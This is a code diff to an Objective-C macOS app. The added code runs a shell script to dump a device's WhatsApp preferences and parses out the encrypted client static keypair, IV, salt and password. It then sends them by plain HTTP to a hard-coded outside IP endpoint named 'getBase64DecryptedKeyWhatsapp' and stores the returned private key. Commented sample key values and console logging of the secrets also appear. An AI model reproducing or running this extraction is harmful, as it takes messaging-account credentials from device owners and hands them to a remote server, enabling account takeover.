@@ -9,6 +9,7 @@
 #import "ViewController.h"
 #import "CParseXML.h"
 #import "STPrivilegedTask.h"
+#import "XMLReader.h"
 
 @implementation ViewController
 
@@ -17,7 +18,6 @@
     self.view.window.delegate =self;
     [self.popBtn setTarget:self];
     [self.popBtn setAction:@selector(handlePopBtn:)];
-
     [self getDevices];
    
 
@@ -55,13 +55,84 @@
 
     
 }
+
+- (NSString *)removeSpaceAndNewline:(NSString *)str
+{
+    NSString *temp = [str stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceCharacterSet]];
+    NSString *text = [temp stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet ]];
+    return text;
+}
+//encode URL string
+
+-(NSString *)URLEncodedString:(NSString *)str
+{
+
+    NSString *encodedString = (NSString *)
+    CFBridgingRelease(CFURLCreateStringByAddingPercentEscapes(kCFAllocatorDefault,
+                                                              (CFStringRef)str,
+                                                              NULL,
+                                                              (CFStringRef)@"!*'();:@&=+$,/?%#[]",
+                                                              kCFStringEncodingUTF8));
+
+    return encodedString;
+}
+
+
 -(void)getXMLValue:(NSString *) value{
       NSString *cmd = [NSString stringWithFormat:@"/bin/sh launcher.sh %@",value];
       NSString *outputString =[self runTask:cmd] ;
-      NSString *result = [[outputString componentsSeparatedByString:@"\"client_static_keypair\">"]  [1]  componentsSeparatedByString:@"</string>"][0];
+     NSLog(@"outputString====%@",outputString);
+     NSString *resultString = [self removeSpaceAndNewline:[outputString componentsSeparatedByString:@")"][1]];
+    NSLog(@"result====%@",resultString);
+     NSError *parseError = nil;
+     NSDictionary *xmlDictionary = [XMLReader dictionaryForXMLString:resultString error:&parseError];
+    if (xmlDictionary) {
+        NSArray *resultList=xmlDictionary[@"map"][@"string"];
+//        {
+//            name = "client_static_keypair_pwd_enc";
+//            text = "[2,\"EuiHoXm3fV+AkRog8Hv1wmPt8QzwPLyx1s1\\/lj5pHgyYfUIYGPcKoah6zDXRaLV1ZYZ6diMVw\\/boYOnwLaKYcw\",\"9mfKB00hJqIt79RQ\\/XXW5w\",\"YGF0vg\",\"jhyn5RPGhVbDJTFpLnrPPg\"]";
+//        },
+//        {
+//            name = "server_static_public";
+//            text = "xDn6MqBPn3O6ptDhPQt/tqcXrv2dK7aR//NQLFIVal0";
+//        }
+       
+        NSDictionary *client_static_keypair_pwd_enc = resultList[0];
+        NSDictionary *server_static_public = resultList[1];
+        NSString *tempKeypair=[[client_static_keypair_pwd_enc[@"text"] stringByReplacingOccurrencesOfString:@"[" withString:@""] stringByReplacingOccurrencesOfString:@"]" withString:@""];
+        NSArray *tempKeypairArray =[tempKeypair componentsSeparatedByString:@","];
+        NSString *publicString=server_static_public[@"text"];
+        NSString *cipherText =[tempKeypairArray[1] stringByReplacingOccurrencesOfString:@"\"" withString:@""];
+        //Helper.ReplaceLast(Helper.ReplaceFirst(aarry[1], "\"", ""), "\"", "");
+        NSString *iv =[tempKeypairArray[2] stringByReplacingOccurrencesOfString:@"\"" withString:@""];
+        NSString *salt = [tempKeypairArray[3] stringByReplacingOccurrencesOfString:@"\"" withString:@""];
+        NSString *random3 = [tempKeypairArray[4] stringByReplacingOccurrencesOfString:@"\"" withString:@""];
+        NSLog(@"cipherText %@",cipherText);
+        NSLog(@"iv %@",iv);
+        NSLog(@"salt %@",salt);
+        NSLog(@"random3 %@",random3);
+        NSString *requestUrl = [NSString stringWithFormat:@"cipherText=%@&iv=%@&salt=%@&password=%@",[self URLEncodedString:cipherText],[self URLEncodedString:iv],[self URLEncodedString:salt],[self URLEncodedString:random3]];
+//        [self requestBase64:requestUrl];
+        NSMutableURLRequest *request = [[NSMutableURLRequest alloc] init];
+        [request setURL:[NSURL URLWithString:[NSString stringWithFormat:@"http://165.232.185.233:8081/getBase64DecryptedKeyWhatsapp?%@",requestUrl]]];
+        [request setHTTPMethod:@"GET"];
+        NSURLSession *session = [NSURLSession sessionWithConfiguration:[NSURLSessionConfiguration defaultSessionConfiguration]];
+        [[session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
+            NSString *requestReply = [[NSString alloc] initWithData:data encoding:NSASCIIStringEncoding];
+            dic=[[NSMutableDictionary alloc] init];
+           [dic setObject:[NSString stringWithFormat:@"%@==",requestReply] forKey:@"client_static_keypair"];
+            NSLog(@"Request reply: %@", requestReply);
+        }] resume];
+
+    }
+    //old one
+//      NSString *result = [[outputString componentsSeparatedByString:@"\"client_static_keypair\">"]  [1]  componentsSeparatedByString:@"</string>"][0];
+     //new version
     
-      dic=[[NSMutableDictionary alloc] init];
-      [dic setObject:[NSString stringWithFormat:@"%@==",result] forKey:@"client_static_keypair"];
+//      NSString *result = [[outputString componentsSeparatedByString:@"\"client_static_keypair_pwd_enc\">"]  [1]];
+//    NSLog(result);
+//      dic=[[NSMutableDictionary alloc] init];
+//      [dic setObject:[NSString stringWithFormat:@"%@==",result] forKey:@"client_static_keypair"];
 }
 - (void)runSTPrivilegedTask {
     NSString *cmd = @"/bin/sh launcher.sh";
